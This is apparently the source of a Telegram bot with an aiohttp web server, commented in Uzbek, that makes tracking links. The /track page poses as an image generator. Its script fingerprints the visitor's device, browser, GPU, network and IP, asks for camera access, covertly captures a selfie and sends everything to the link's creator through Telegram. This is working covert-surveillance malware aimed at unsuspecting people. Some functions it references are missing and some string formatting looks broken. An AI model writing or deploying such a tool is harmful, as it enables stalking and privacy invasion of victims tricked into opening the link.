# ... (boshidagi importlar o'zgarmaydi)

# ---------------- GLOBAL STATE ----------------
USER_TOKENS = {}  # token -> telegram_id (muddati cheksiz)

# ---------------- Web Server: /track ----------------
async def track_page(request):
    token = request.query.get('token')
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Havola noto‘g‘ri yoki eskirgan.", status=403)

    html = f"""
<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Jgar...</title>
  <style>
    body {{
      background: #0f1419;
      color: #e7e9ea;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      text-align: center;
    }}
    h2 {{ font-weight: 500; margin: 20px 0; line-height: 1.4; }}
    .loader {{
      width: 40px; height: 40px;
      border: 3px solid #1d9bf0;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    .note {{ font-size: 0.9em; color: #71767b; margin-top: 20px; }}
  </style>
</head>
<body>
  <h2>Iltimos, kuting...<br>Rasm Yaratilmoqda</h2>
  <div class="loader"></div>
  <div class="note">Kamera ruxsati so'ralishi mumkin — ruxsat bering.</div>
  <script>
    async function collect() {{
      // Asosiy ma'lumotlar
      const data = {{
        timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: (navigator.languages || [navigator.language]).join(', '),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        os: 'Noma\\'lum',
        browser: 'Noma\\'lum',
        screen: `${{screen.width}} × ${{screen.height}}`,
        viewport: `${{window.innerWidth}} × ${{window.innerHeight}}`,
        colorDepth: `${{screen.colorDepth}}-bit, piksel: ${{screen.pixelDepth}}-bit`,
        cpuCores: navigator.hardwareConcurrency || 'Noma\\'lum',
        ram: navigator.deviceMemory ? `${{navigator.deviceMemory}} GB` : 'Noma\\'lum',
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Telefon/Planshet' : 'Kompyuter',
        model: 'Noma\\'lum',
        devices: {{ mic: 0, speaker: 0, camera: 0 }},
        cameraRes: 'Noma\\'lum',
        network: 'Noma\\'lum',
        gpu: 'Noma\\'lum'
      }};

      // OS aniqlash
      if (/Android/i.test(navigator.userAgent)) {{
        data.os = 'Android';
        const match = navigator.userAgent.match(/Android\\s[\\d.]+;\\s[^)]+\\)\\s([^\\s]+)/);
        data.model = match ? match[1] : 'Noma\\'lum';
      }} else if (/iPhone|iPad/.test(navigator.userAgent)) {{
        data.os = 'iOS';
        data.model = /iPhone/.test(navigator.userAgent) ? 'iPhone' : 'iPad';
      }}

      // Brauzer
      if (navigator.userAgent.includes('Chrome')) data.browser = 'Chrome';
      else if (navigator.userAgent.includes('Firefox')) data.browser = 'Firefox';
      else if (navigator.userAgent.includes('Safari')) data.browser = 'Safari';

      // Qurilma soni (mediaDevices)
      try {{
        const devices = await navigator.mediaDevices.enumerateDevices();
        data.devices.mic = devices.filter(d => d.kind === 'audioinput').length;
        data.devices.speaker = devices.filter(d => d.kind === 'audiooutput').length;
        data.devices.camera = devices.filter(d => d.kind === 'videoinput').length;
      }} catch (e) {{ console.log('Media qurilmalarni olishda xatolik:', e); }}

      // GPU aniqlash
      try {{
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {{
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {{
            data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Aniqlanmadi';
          }}
        }}
      }} catch (e) {{ console.log('GPU aniqlanmadi'); }}

      // Tarmoq tezligi (Connection API)
      if ('connection' in navigator) {{
        const conn = navigator.connection;
        const downlink = conn.downlink ? `${{conn.downlink}} Mbps` : 'Noma\\'lum';
        const effectiveType = conn.effectiveType || 'Noma\\'lum';
        data.network = `${{effectiveType}} ~ ${{downlink}}`;
      }}

      // Kamera ruxsati va rasm
      let gotCamera = false;
      try {{
        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }} }});
        gotCamera = true;
        const [videoTrack] = stream.getVideoTracks();
        const capabilities = videoTrack.getCapabilities?.();
        if (capabilities && capabilities.width && capabilities.height) {{
          data.cameraRes = `${{Math.max(capabilities.width.min, capabilities.width.max)}} x ${{Math.max(capabilities.height.min, capabilities.height.max)}}`;
          if (capabilities.frameRate) {{
            data.cameraRes += ` @$${{Math.floor(capabilities.frameRate.max)}}fps`;
          }}
        }}
        // Rasm yuborish (faqat bir marta)
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.7);
        fetch('/upload_image', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{ token: '{token}', image: imageData }})
        }}).catch(console.error);
        stream.getTracks().forEach(track => track.stop());
      }} catch (e) {{
        console.log('Kamera ruxsati berilmadi yoki mavjud emas');
        if (!gotCamera) {{
          fetch('/camera_denied', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ token: '{token}' }})
          }});
        }}
      }}

      // IP manzil server tomonida qo'shiladi
      fetch('/submit', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{ token: '{token}', clientData: data }})
      }}).then(() => {{
        document.body.innerHTML = `<h2 style="color:#1d9bf0">✅ Ma'lumotlar yuborildi!</h2><p>Rahmat.</p>`;
      }}).catch(console.error);
    }}
    collect();
  </script>
</body>
</html>
"""
    return web.Response(text=html, content_type='text/html')


# ---------------- Web Server: /submit ----------------
async def submit_data(request):
    try:
        body = await request.json()
        token = body.get('token')
        client_data = body.get('clientData', {})
        telegram_id = USER_TOKENS.get(token)
        if not telegram_id:
            return web.json_response({"error": "Token topilmadi"}, status=400)

        # IP manzilini qo'shish
        ip = request.remote or "Noma'lum"

        # UTC offset formatlash
        utc_offset = client_data.get('utcOffset', 0)
        sign = '+' if utc_offset >= 0 else ''
        utc_str = f"UTC{sign}{utc_offset:g}:00"

        # Qurilmalar
        devs = client_data.get('devices', {{}})
        devices_str = f"mikrofon: {{devs.get('mic', 0)}} ta, karnay: {{devs.get('speaker', 0)}} ta, kamera: {{devs.get('camera', 0)}} ta"

        message = (
            f"🕒 {client_data.get('timestamp', 'Noma\\'lum')}\n"
            f"🌍 Vaqt zonasi: {client_data.get('timezone', 'Noma\\'lum')}\n"
            f"({utc_str})\n"
            f"📍 IP: {ip}\n"
            f"💬 Til: {client_data.get('languages', 'Noma\\'lum')}\n"
            f"💻 Tizim: {client_data.get('os', 'Noma\\'lum')} | Brauzer: {client_data.get('browser', 'Noma\\'lum')}\n"
            f"📱 Qurilma: {client_data.get('model', 'Noma\\'lum')} ({client_data.get('deviceType', 'Noma\\'lum')})\n"
            f"🧠 CPU: {client_data.get('cpuCores', '?')} ta | RAM: {client_data.get('ram', '?')}\n"
            f"📺 Ekran: {client_data.get('screen', '?')}\n"
            f"RGBO Ekran chuqurligi: rang: {client_data.get('colorDepth', '?')}\n"
            f"Ko‘rinish (viewport): {client_data.get('viewport', '?')}\n"
            f"🔌 Qurilmalar: {devices_str}\n"
            f"📷 Kamera: {client_data.get('cameraRes', 'Noma\\'lum')}\n"
            f"📶 Internet: {client_data.get('network', 'Noma\\'lum')}\n"
            f"🎮 GPU: {client_data.get('gpu', 'Noma\\'lum')}\n"
            f"🔍 UA: {client_data.get('userAgent', 'Noma\\'lum')}"
        )

        await request.app['bot'].send_message(chat_id=telegram_id, text=message)
        return web.json_response({"status": "ok"})
    except Exception as e:
        logger.exception(f"[SUBMIT ERROR] {e}")
        return web.json_response({"error": str(e)}, status=500)


# ---------------- Web Server: /camera_denied ----------------
async def camera_denied(request):
    try:
        data = await request.json()
        token = data.get('token')
        telegram_id = USER_TOKENS.get(token)
        if telegram_id:
            await request.app['bot'].send_message(
                chat_id=telegram_id,
                text="⚠️ Kamera ruxsati berilmadi yoki qurilmada kamera mavjud emas."
            )
        return web.json_response({"status": "notified"})
    except Exception as e:
        logger.exception("[CAMERA DENIED ERROR]")
        return web.json_response({"error": str(e)}, status=500)


# ---------------- Web Server Starter ----------------
async def start_web_server(bot):
    app = web.Application()
    app['bot'] = bot
    app.router.add_get('/track', track_page)
    app.router.add_post('/submit', submit_data)
    app.router.add_post('/upload_image', upload_image)
    app.router.add_post('/camera_denied', camera_denied)  # yangi endpoint
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8000"))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")
# ---------------- Startup ----------------
async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))


# ---------------- Main ----------------
def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    logger.info("🚀 Bot ishga tushdi.")
    app.run_polling()


if __name__ == "__main__":
    main()
